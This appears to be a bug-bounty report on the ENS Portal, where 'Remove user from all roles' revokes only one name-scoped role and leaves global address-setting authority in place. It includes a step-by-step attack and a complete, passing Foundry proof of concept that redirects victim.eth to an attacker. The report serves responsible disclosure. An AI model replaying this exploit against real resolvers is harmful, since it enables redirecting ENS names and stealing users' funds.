# 92738 w a critical resolver remove user from all roles revokes only one scope leaving global address hijack authority active

**Submitted on Sep 11th 2026 at 21:56:32 UTC by @kl4r10n for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92738
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

The Portal groups resolver-role records solely by account. It merges assignments from the resolver's global root resource and any number of name resources into one editable table row.

When the resolver owner clicks **Remove user**, Portal chooses the first non-root name and submits one name-scoped revocation containing the union of every role displayed in the merged row. The transaction succeeds, the selected name's role is removed, and the UI closes after telling the owner that the account was removed “from all roles.” However, the account's global roles and roles on every other name resource remain active.

A delegate whose global `ROLE_SET_ADDR` survives this action can continue changing address records for every name using the resolver. The supposedly removed delegate can therefore redirect a victim ENS name to an attacker-controlled address and steal funds sent through ENS resolution.

## Security impact

This is not merely stale UI state. The application constructs and submits the wrong on-chain authorization change.

After Portal reports a successful removal, the delegate remains authorized to execute:

```solidity
resolver.setAddr(namehash("victim.eth"), attacker);
```

Because root roles are inherited by all name resources, `victim.eth` then resolves to the attacker's address. Wallets and applications resolving that name can send funds to the attacker.

This matches the competition's Critical impact describing an application resolving or rendering an ENS name to an attacker-controlled address so a user sends funds to an unintended recipient.

## Preconditions

The affected resolver must contain at least two role records for the same delegate on different resources. The strongest example is:

| Resource             | Delegate role   |
| -------------------- | --------------- |
| Root/global resource | `ROLE_SET_ADDR` |
| `decoy.eth`          | `ROLE_SET_TEXT` |

This is a valid and supported resolver configuration. Global roles apply across all names using the resolver, while name roles apply only to their specific resource.

The attacker does not need the victim's wallet, session, or signing key. They need only remain in possession of the delegate account that the victim attempts to remove.

## Affected code and complete data flow

### 1. Portal destroys the resource boundary while grouping records

`apps/portal/src/lib/roles/resolverRoles.ts:179-220` uses only the lower-cased account as the grouping key:

```ts
export const groupRolesByAccount = <T extends RoleInput>(
  roles: readonly T[],
  resourceToName?: Map<string, string>,
): AccountRoleGroup<T>[] => {
  const grouped = new Map<
    string,
    {
      account: string
      resolvedNames: Set<string>
      roles: T[]
      decodedRoles: string[]
    }
  >()

  for (const role of roles) {
    const account = role.account.toLowerCase()
    const resource = role.resource.toLowerCase()
    const decoded = decodeResolverRoleBitmap(role.roleBitmap)
    const resolvedName = resourceToName?.get(resource) ?? null

    const existing = grouped.get(account)

    if (existing) {
      existing.roles.push(role)
      existing.decodedRoles.push(...decoded)
      if (resolvedName) existing.resolvedNames.add(resolvedName)
    } else {
      const names = new Set<string>()
      if (resolvedName) names.add(resolvedName)
      grouped.set(account, {
        account,
        resolvedNames: names,
        roles: [role],
        decodedRoles: [...decoded],
      })
    }
  }

  return Array.from(grouped.values()).map((g) => ({
    ...g,
    resolvedNames: Array.from(g.resolvedNames),
  }))
}
```

The result retains the raw role objects in `roles`, but the editable UI uses the flattened `decodedRoles` and `resolvedNames`. It therefore loses which bitmap belongs to which resource.

The application's existing unit test explicitly confirms the cross-resource merge at `apps/portal/src/lib/roles/resolverRoles.test.ts:185-197`:

```ts
it('should merge the same account across resources', () => {
  const resourceB =
    '0x1111111111111111111111111111111111111111111111111111111111111111'
  const roles = [
    makeRole('0xABC', resolverRoles.ROLE_SET_ADDR),
    makeRole('0xABC', resolverRoles.ROLE_SET_TEXT, resourceB),
  ]
  const result = groupRolesByAccount(roles)

  expect(result).toHaveLength(1)
  expect(result[0].roles).toHaveLength(2)
  expect(result[0].decodedRoles).toEqual(['ROLE_SET_ADDR', 'ROLE_SET_TEXT'])
})
```

### 2. Portal selects exactly one non-root resource

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-193` derives one `roleName` for the whole merged row:

```ts
const selectedAccount = row?.original.account as Address
const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
const resolvedNames = row?.original.resolvedNames ?? []

const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

If the account has any name-scoped assignment, `roleName` is non-empty even when the row also contains global roles.

### 3. “Remove user from all roles” flattens every role into that one scope

The confirmation at `ResolverRolesSidebar.tsx:441-448` promises:

```tsx
<DialogDescription>
  Are you sure you want to remove this user from all roles? This action cannot
  be undone.
</DialogDescription>
```

But `handleRemoveUser()` at lines 307-322 creates only one action:

```ts
setPendingAction({
  type: 'remove',
  name: roleName,
  account: selectedAccount,
  roles: decodedRoles,
})
```

Lines 486-493 then submit that single name and the flattened role list:

```ts
removeUserMutation.mutate({
  name: pendingAction.name,
  account: pendingAction.account,
  roles: pendingAction.roles,
})
```

### 4. A non-empty name is always encoded as a name-scoped revocation

`apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-60` chooses exactly one scope:

```ts
const writeParams = revokeResolverRolesWriteParameters(
  walletClient as Parameters<typeof revokeResolverRolesWriteParameters>[0],
  name === ''
    ? {
        resolverAddress,
        targetAccount: account,
        scope: 'root',
        roles: roles as ResolverRole[],
      }
    : {
        resolverAddress,
        targetAccount: account,
        scope: 'name',
        name,
        roles: roles as ResolverRole[],
      },
)
```

For the example row, Portal produces the semantic equivalent of:

```solidity
resolver.authorizeNameRoles(
    dnsEncode("decoy.eth"),
    ROLE_SET_ADDR | ROLE_SET_TEXT,
    delegate,
    false
);
```

It never calls `revokeRootRoles(ROLE_SET_ADDR, delegate)`. The global role consequently survives.

## Step-by-step attack

1. Alice controls a permissioned resolver used by `victim.eth` and `decoy.eth`.
2. Mallory has global `ROLE_SET_ADDR` and name-scoped `ROLE_SET_TEXT` on `decoy.eth`.
3. The resolver-role page receives two role records from the indexer.
4. `groupRolesByAccount()` merges them into one Mallory row with:
   * `resolvedNames = ['(root)', 'decoy.eth']`
   * `decodedRoles = ['ROLE_SET_ADDR', 'ROLE_SET_TEXT']`
5. Alice opens Mallory's row and clicks **Remove user**.
6. Portal displays “remove this user from all roles.”
7. Portal chooses `decoy.eth`, because it is the first resolved name that is not `(root)`.
8. Alice approves the transaction. The transaction successfully removes `ROLE_SET_TEXT` from the `decoy.eth` resource.
9. Portal reports completion and closes the role sidebar.
10. Mallory's root `ROLE_SET_ADDR` was never targeted and remains active.
11. Without further Alice interaction, Mallory changes `victim.eth`'s ETH address to Mallory's address.
12. A third party resolves `victim.eth` and sends funds to Mallory.

The same root cause affects two or more non-root resources: Portal updates only the first name, leaving the delegate's assignments on all remaining names active.

## Why the transaction succeeds instead of warning the victim

Revoking a bitmap from `decoy.eth` does not mean “remove these roles from every resource.” The resolver applies the revocation only to the resource derived from `decoy.eth`.

The `ROLE_SET_TEXT` bit exists on that resource, so the transaction performs a real state change and succeeds. Including `ROLE_SET_ADDR` in the same bitmap does not redirect the revocation to the root resource. The global role therefore remains untouched while the successful name-role removal gives Portal a plausible success signal.

There is no post-transaction check that the delegate has no remaining root or name assignments.

## Known-issue differentiation

The supplied known-issues document contains no resolver-role grouping or cross-scope revocation issue.

QA-01 concerns certain role combinations causing errors after **name transfers**. This finding:

* occurs on the resolver role-management page;
* requires no name transfer;
* produces a successful transaction rather than an error;
* leaves a supposedly removed delegate with effective global authority; and
* allows a successful post-removal address hijack.

It is therefore not the disclosed QA-01 behavior or a variant of the disclosed seven-day session-key design.

## Recommended remediation

Do not merge editable authorization rows across resources. The safe base model is one row per `(account, resource)` pair. Each edit must preserve the exact resource and bitmap from the corresponding indexer record.

If the intended feature is truly “Remove user from all roles,” use the raw `row.original.roles` records that the grouping code already retains:

1. Group those records by their exact `resource`.
2. Build one revocation for the root resource, if present.
3. Build one revocation for each name resource, using only that resource's bitmap.
4. Execute every required revocation atomically where possible.
5. Re-read the resolver's role inventory.
6. Report success only when no assignment for that account remains.

The confirmation and transaction preview should explicitly enumerate the affected scopes, for example:

```
Global: ROLE_SET_ADDR
decoy.eth: ROLE_SET_TEXT
other.eth: ROLE_SET_CONTENTHASH
```

Add regression tests covering:

* one account with root and name roles;
* one account with roles on multiple names;
* the same role bit assigned at both root and name scope;
* partial transaction failure; and
* post-removal verification that no authority remains.

## Proof of Concept

## Full executable proof of concept

The PoC is independent of the application's mocks. It deploys a real `PermissionedResolver`, creates the exact mixed-scope permission state, executes the semantic transaction generated by Portal, verifies the name-scoped removal succeeded, proves the root role survived, and uses that role to redirect another name.

### Environment

* Repository: `https://github.com/ensdomains/contracts-v2.git`
* Tested commit: `48b3e2d39513b9dd32ef1850877a29009bc807b9`
* Test file: `contracts/test/poc/PortalResolverRoleScopePoC.t.sol`
* Foundry compiler selected by the repository: Solidity `0.8.35`

From the `contracts-v2` repository root, place the following complete file at `contracts/test/poc/PortalResolverRoleScopePoC.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";

import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";

/// @notice End-to-end reproduction of the Portal's cross-resource role-removal bug.
contract PortalResolverRoleScopePoC is Test {
    VerifiableFactory internal factory;
    PermissionedResolver internal implementation;
    PermissionedResolver internal resolver;

    address internal owner = makeAddr("owner");
    address internal delegate = makeAddr("delegate");
    address internal attacker = makeAddr("attacker");

    bytes internal decoyName;
    bytes32 internal victimNode;

    function setUp() external {
        factory = new VerifiableFactory();
        implementation = new PermissionedResolver(address(this));

        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize,
            (owner, EACBaseRolesLib.ALL_ROLES, new bytes[](0))
        );

        resolver = PermissionedResolver(
            factory.deployProxy(
                address(implementation),
                uint256(keccak256(initData)),
                initData
            )
        );

        decoyName = NameCoder.encode("decoy.eth");
        victimNode = NameCoder.namehash(NameCoder.encode("victim.eth"), 0);
    }

    function test_portalRemoveAllLeavesGlobalAddressHijackRole() external {
        uint256 globalAddrRole = PermissionedResolverLib.ROLE_SET_ADDR;
        uint256 decoyTextRole = PermissionedResolverLib.ROLE_SET_TEXT;

        // Precondition represented by two indexer rows for the same delegate:
        //   ROOT_RESOURCE -> ROLE_SET_ADDR
        //   decoy.eth     -> ROLE_SET_TEXT
        vm.startPrank(owner);
        resolver.grantRootRoles(globalAddrRole, delegate);
        resolver.authorizeNameRoles(decoyName, decoyTextRole, delegate, true);
        vm.stopPrank();

        assertTrue(
            resolver.hasRootRoles(globalAddrRole, delegate),
            "delegate should initially have global SET_ADDR"
        );

        uint256 decoyResource = PermissionedResolverLib.resource(
            NameCoder.namehash(decoyName, 0),
            0
        );
        assertTrue(
            resolver.hasRoles(decoyResource, decoyTextRole, delegate),
            "delegate should initially have decoy.eth SET_TEXT"
        );

        // Exact semantic equivalent of Portal's 'Remove user from all roles':
        // it merges both bitmaps, chooses the first non-root name, and submits
        // authorizeNameRoles(decoy.eth, SET_ADDR | SET_TEXT, delegate, false).
        vm.prank(owner);
        bool changed = resolver.authorizeNameRoles(
            decoyName,
            globalAddrRole | decoyTextRole,
            delegate,
            false
        );
        assertTrue(changed, "Portal removal transaction reports success");

        // The name-scoped permission is gone, making the UI action look valid.
        assertFalse(
            resolver.hasRoles(decoyResource, decoyTextRole, delegate),
            "decoy.eth role should be revoked"
        );

        // The root permission was never targeted and remains effective.
        assertTrue(
            resolver.hasRootRoles(globalAddrRole, delegate),
            "BUG: global SET_ADDR survives Remove user from all roles"
        );

        // Exploit: the supposedly removed delegate redirects victim.eth.
        vm.prank(delegate);
        resolver.setAddr(victimNode, attacker);

        assertEq(
            resolver.addr(victimNode),
            attacker,
            "victim.eth now resolves to the attacker"
        );
    }
}
```

### Execution command

Run from the repository's `contracts` directory:

```bash
forge test --offline \
  --match-path test/poc/PortalResolverRoleScopePoC.t.sol \
  -vv
```

### Observed execution result

```
Compiling 1 files with Solc 0.8.35
Solc 0.8.35 finished in 597.54ms
Compiler run successful with warnings:
Warning (4591): There are more than 256 warnings. Ignoring the rest.

Ran 1 test for test/poc/PortalResolverRoleScopePoC.t.sol:PortalResolverRoleScopePoC
[PASS] test_portalRemoveAllLeavesGlobalAddressHijackRole() (gas: 141018)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.75ms (654.08µs CPU time)

Ran 1 test suite in 6.27ms (3.75ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The passing final assertion proves that, after the Portal-equivalent successful removal, the delegate can still set `victim.eth` to the attacker address.

## Application-level reproduction result

The relevant unmodified Portal suite was also executed from `apps/portal`:

```bash
./node_modules/.bin/vitest run \
  src/lib/roles/resolverRoles.test.ts \
  --reporter=verbose
```

Observed summary:

```
Test Files  1 passed (1)
Tests       16 passed (16)
```

The passing suite includes:

```
✓ groupRolesByAccount > should merge the same account across resources
```

This confirms that the lossy cross-resource merge is current application behavior rather than an assumption made only by the Solidity PoC.
